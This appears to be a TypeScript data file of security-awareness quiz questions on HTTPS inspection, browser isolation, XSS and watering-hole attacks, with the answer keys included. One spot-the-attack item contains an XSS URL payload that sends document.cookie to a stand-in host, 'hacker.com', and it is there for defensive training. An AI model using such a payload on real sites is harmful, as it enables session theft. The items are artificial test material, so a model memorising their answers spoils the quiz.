import type { Question } from '../types';

export const mediumQuestions: Question[] = [
  {
    id: "sb_med_m1",
    type: "MCQ",
    topic: "SSL/TLS Inspection",
    questionText: "What is the purpose of 'HTTPS Inspection' (SSL Decryption) in a corporate network?",
    scenario: {},
    options: [
      { id: "a", key: "A", text: "To steal your bank passwords" },
      { id: "b", key: "B", text: "To scan encrypted traffic for malware that would otherwise be hidden" },
      { id: "c", key: "C", text: "To make the Wi-Fi signal stronger" },
      { id: "d", key: "D", text: "To block YouTube" }
    ],
    correctOptionId: "b",
    scoreValue: 10,
    feedback: {
      explanation: "Malware authors use HTTPS to hide their code from basic security tools. Companies 'inspect' the traffic to ensure nothing malicious is coming through.",
      proTip: "Privacy is important, but in a work environment, security often requires inspecting data at the network edge.",
      redFlags: ["Encrypted malware delivery"]
    }
  },
  {
    id: "sb_med_f1",
    type: "FILL_BLANK",
    topic: "Browser Security",
    questionText: "Complete the technical description of browser isolation.",
    scenario: {},
    blanks: [
      { id: "f1", textBefore: "A security technique that runs your browser in a disposable virtual container is called ", correctAnswer: "Browser Isolation", textAfter: "." },
      { id: "f2", textBefore: "This ensures that if you visit a malicious site, the malware cannot 'escape' to your real ", correctAnswer: "operating system", textAfter: "." }
    ],
    scoreValue: 10,
    feedback: {
      explanation: "Isolation is the ultimate defense for high-risk web browsing.",
      proTip: "Use 'Sandbox' features if your work requires visiting unknown or potentially dangerous websites.",
      redFlags: ["Browser breakout attacks"]
    }
  }
];

export const hardQuestions: Question[] = [
  {
    id: "sb_hard_s1",
    type: "SPOT",
    topic: "Cross-Site Scripting (XSS)",
    questionText: "Identify the XSS attack in this URL.",
    scenario: {
      url: "https://vulnerable-shop.com/search?q=<script>fetch('http://hacker.com/steal?c=' + document.cookie)</script>"
    },
    redFlags: [
      { id: "rf1", x: 60, y: 15, label: "Malicious Script Injection", explanation: "The URL contains a <script> tag that attempts to steal your browser cookies and send them to an external server." }
    ],
    scoreValue: 10,
    feedback: {
      explanation: "XSS is a common web vulnerability where an attacker injects malicious code into a website you trust.",
      proTip: "Modern browsers have some built-in XSS protection, but the best defense is for websites to 'sanitize' all user input.",
      redFlags: ["Script injection in URL"]
    }
  },
  {
    id: "sb_hard_o1",
    type: "OPEN_TEXT",
    topic: "Watering Hole Attack",
    questionText: "Explain how a 'Watering Hole' attack works and why it is more effective against specific industries (like Aerospace or Finance) than general phishing.",
    scenario: {},
    scoreValue: 10,
    feedback: {
      explanation: "An attacker identifies a website that employees of a specific industry visit often (like a niche news site or professional forum). They hack that site and plant malware. When the targets visit their favorite 'Watering Hole', they are infected. It's effective because it exploits the trust users have in a specific, niche community site.",
      proTip: "Security isn't just about your site; it's about every site your team visits.",
      redFlags: ["Compromised industry portals"]
    }
  }
];
